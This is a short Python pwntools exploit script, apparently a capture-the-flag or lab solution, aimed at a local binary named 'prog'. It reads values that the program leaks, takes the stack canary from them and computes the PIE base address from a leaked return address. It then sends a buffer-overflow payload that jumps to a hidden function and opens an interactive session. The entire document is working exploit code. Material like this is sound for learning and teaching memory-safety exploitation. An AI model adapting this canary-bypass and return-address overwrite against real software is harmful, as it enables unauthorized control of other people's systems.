from pwn import *

context.binary = 'prog'
e = context.binary

p = e.process()

p.readuntil(b':\n')

disclosed = []
for i in range(9):
	disclosed.append(int(p.readline()))

cookie = disclosed[7]
op = arg = ''
for line in e.functions.main.disasm().splitlines():
	if op == 'call' and int(arg, 16) == e.sym.disclosure:
		retaddr = int(line.split(':')[0], 16)
		break
	op, arg = line.split()[-2:]
e.address += disclosed[5] - retaddr
assert e.address & 0xfff == 0

addr = e.sym.unused_remainder_from_old_version

print(disclosed)
print(addr)

payload = b'A'
payload += pack(cookie)
payload += pack(0)
payload += pack(addr)

p.sendline(payload)
p.interactive()
